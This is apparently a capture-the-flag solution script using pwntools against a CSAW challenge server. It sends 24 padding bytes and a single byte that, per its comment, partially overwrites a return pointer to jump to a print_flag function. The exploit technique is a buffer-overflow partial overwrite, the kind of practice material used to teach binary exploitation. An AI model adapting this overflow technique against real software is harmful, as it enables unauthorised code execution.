from pwn import *

r = remote('pwn.chal.csaw.io', 10103)

p = ''
p += 'A'*24
p += '\x10' # overwrites last byte to print_flag

r.send(p)

r.interactive()
